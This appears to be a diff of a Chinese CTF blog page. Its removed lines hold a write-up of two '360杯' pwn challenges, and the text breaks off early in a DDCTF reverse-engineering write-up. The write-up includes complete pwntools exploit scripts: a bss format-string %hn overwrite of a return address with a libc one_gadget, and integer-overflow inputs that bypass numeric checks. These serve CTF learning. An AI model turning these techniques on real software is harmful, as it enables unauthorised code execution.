-<h4 id="修改ret地址"><a href="#修改ret地址" class="headerlink" title="修改ret地址"></a>修改ret地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">0xffff</span> &amp; ret, <span class="number">0xffff</span> &amp; one_gadget)</span><br><span class="line">write((<span class="number">0xffff</span>&amp;ret) + <span class="number">2</span>, (<span class="number">0xffff0000</span> &amp; one_gadget)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">sla(<span class="string">"2. Exit\n"</span>, <span class="string">"2"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这里先写后两个字节，在写前两个字节，写成one_gadget</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./7631454338ff70b1a6b1262f5f36beac'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Input</span><span class="params">(content)</span>:</span></span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"It's time to input something\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(size1, size2)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size1, <span class="number">21</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size2, <span class="number">57</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload =<span class="string">"123456781234567"</span></span><br><span class="line">    Input(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#stage 1</span></span><br><span class="line">    payload = <span class="string">"%22$x%15$x"</span></span><br><span class="line">    Input(payload)</span><br><span class="line">    stack_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">    ret = stack_addr - <span class="number">0xa0</span></span><br><span class="line">    count = stack_addr - <span class="number">0xc8</span></span><br><span class="line">    __libc_start_main_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)<span class="number">-241</span></span><br><span class="line">    lg(<span class="string">"stack_addr"</span>, stack_addr)</span><br><span class="line">    lg(<span class="string">"ret_addr"</span>, ret)</span><br><span class="line">    lg(<span class="string">"libc_start_main"</span>, __libc_start_main_addr)</span><br><span class="line">    lg(<span class="string">"count"</span>, count)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    one_gadget = [<span class="number">0x1395ba</span>, <span class="number">0x1395bb</span>]</span><br><span class="line">    one_gadget = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">    lg(<span class="string">"one_gadget"</span>, one_gadget)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    write(<span class="number">0xffff</span> &amp; count + <span class="number">2</span>, <span class="number">0xffff</span>)</span><br><span class="line">    write(<span class="number">0xffff</span> &amp; ret, <span class="number">0xffff</span> &amp; one_gadget)</span><br><span class="line">    <span class="comment">#gdb.attach(io, "b printf \n c")</span></span><br><span class="line">    write((<span class="number">0xffff</span>&amp;ret) + <span class="number">2</span>, (<span class="number">0xffff0000</span> &amp; one_gadget)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>这道题看着贼简单，打比赛的时候也不会做，细心想了下，我是傻逼，这道题流程很简单</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init(*&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( bypass1() &amp;&amp; bypass2() )</span><br><span class="line">    system(<span class="string">"cat ./flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"failed!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>过了两个判断就拿到flag了</p>
-<h3 id="bypass第一个判断"><a href="#bypass第一个判断" class="headerlink" title="bypass第一个判断"></a>bypass第一个判断</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">bypass1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"x: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"y: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(&amp;s, <span class="string">'-'</span>) || <span class="built_in">strchr</span>(&amp;buf, <span class="string">'-'</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  v2 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x167</span> || v2 &gt; <span class="number">0x167</span> || v1 - v2 != <span class="number">0x168</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"level1 success!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看着很简单，不能输入负数，然后两个数要求小于167，相减又要等于168，常规思路肯定是不行的，想想<br>-0x1 - (-0x169) = 0x168</p>
-<p>这是我第一次做的时候想到的，然后实际上是误打误撞做出来的，做出来后我发觉那会不理解这道题，就重新理了下思路，发觉还是有可以学习的地方的</p>
-<ol>
-<li><p>程序限制了不能输入负数</p>
-</li>
-<li><p>限制了大小</p>
-</li>
-<li><p>还有注意一点v1跟v2是int 4字节的，atoi转超过int最大的数值的话，会发生截断，只保留后低四个字节的值<br>假设输入的是0x7FFFFFFFF 7个F他只会取到后面的0xFFFFFFFF<br>所以限制输入不能带-号，而实际上内存里存值是只分大小的，所以我存0xFFFFFFFF 按有符号处理的话就是-1</p>
-</li>
-<li><p>s串跟buf串是相邻的，填满了buf的话，会将s里的值也一起传递过来，一起转成数字，就变成一个比较大的数了</p>
-</li>
-</ol>
-<p><strong>坑点: atoi函数遇到\n会停止，没有遇到就继续。。原来我用sendafter一直不行，坑了我好久</strong></p>
-<p>最后我用0x167-(-1)绕过了这个判断<br>就是输入0x167跟0x7FFFFFFFF,绕过这个判断</p>
-<h3 id="bypass第二个判断"><a href="#bypass第二个判断" class="headerlink" title="bypass第二个判断"></a>bypass第二个判断</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_<span class="function">BOOL8 <span class="title">bypass2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input x and y:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d %d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">  <span class="keyword">return</span> v1 &gt; <span class="number">1</span> &amp;&amp; v2 &gt; <span class="number">360</span> &amp;&amp; v1 * v2 == <span class="number">360</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个的话，也是利用溢出绕过,说下怎么求溢出的吧，口算也可以的嘞，不过脚本能跑就不动脑了</p>
-<p>我要达到的数值是<em>00000168，</em>为任意数值，反正后4个字节得是0x168,跑一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    print(i, <span class="number">0x100000168</span>/float(i))</span><br></pre></td></tr></table></figure>
-<p>结果如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="number">1</span>, <span class="number">4294967656.0</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="number">2147483828.0</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="number">1431655885.3333333</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="number">1073741914.0</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="number">858993531.2</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="number">715827942.6666666</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="number">613566808.0</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="number">536870957.0</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="number">477218628.4444444</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="number">429496765.6</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="number">390451605.09090906</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="number">357913971.3333333</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="number">330382127.38461536</span>)</span><br><span class="line">(<span class="number">14</span>, <span class="number">306783404.0</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="number">286331177.06666666</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="number">268435478.5</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="number">252645156.2352941</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="number">238609314.2222222</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="number">226050929.2631579</span>)</span><br></pre></td></tr></table></figure>
-
-<p>我选的要是不带小数的，我看着8吉利就选了他了，<br>所以输入为8跟536870957</p>
-<p>所以最后可以拿到flag了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Process <span class="string">'./5b7420a5bcdc1da85bccc62dcea4c7b8'</span> stopped with <span class="built_in">exit</span> code 0 (pid 16098)</span><br><span class="line">[DEBUG] Received 0x27 bytes:</span><br><span class="line">    <span class="string">'cat: ./flag: No such file or directory\n'</span></span><br><span class="line">cat: ./flag: No such file or directory</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'5b7420a5bcdc1da85bccc62dcea4c7b8'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">"x: \n"</span>, str(<span class="number">0x167</span>))</span><br><span class="line">    sla(<span class="string">"y: \n"</span>, str(<span class="number">0x7ffffffff</span>))</span><br><span class="line">    <span class="comment">#sl(str(0x7ffffe98) + " " + str(0x7fffffff))</span></span><br><span class="line">    sl(str(<span class="number">0x8</span>) + <span class="string">" "</span> + str(<span class="number">536870957</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学了下非栈里的格式化字符串利用，还有整数溢出部分详细的了解调试了下，希望能学到更多新知识</p>
-
+          <h1 id="360杯pwn题解"><a href="#360杯pwn题解" class="headerlink" title="360杯pwn题解"></a>360杯pwn题解</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>格式化字符串的题目，不过不是常规的栈格式化字符串，放到了bss段里的格式化字符串，当初做的时候不知道，以为常规。。。剩半个钟的时候发觉了，然后也没做了，后面复盘把他做了，发觉也不是那么一蹴而就的，有点意思</p><p>还有个点我不清楚。当时远程泄露libc我是查不到的，所以这个我不知道该如何解决？希望各位大佬能指点一二</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/19/360/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1174,7 +1222,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/ddctf-re1-2/" class="post-meta-item leancloud_visitors" data-flag-title="滴滴ctf_re1,2" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/ddctf-re1-2/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/ddctf-re1-2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -1199,26 +1268,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="DDCTF之re1详解"><a href="#DDCTF之re1详解" class="headerlink" title="DDCTF之re1详解"></a>DDCTF之re1详解</h1><p>前言：re1,可能我的是非预期解法吧，re2的话，可能也是非预期吧，不过做出来过后感觉这两道都蛮简单的，不会做的时候就是个傻子。。。</p>
-<h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>用ida打开这个程序，出现upx1,明显upx壳，linux下我用upx -d filename 脱了壳后。我先把ida出来的flag复制提交了下，没用。。。然后开始看算法，</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input code:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v6);</span><br><span class="line">  sub_401000(&amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4, <span class="string">"DDCTF&#123;reverseME&#125;"</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You've got it!!%s\n"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try again later.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>整个过程很明朗，没有挖坑，关键函数就在sub_401000处，进去后</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a1 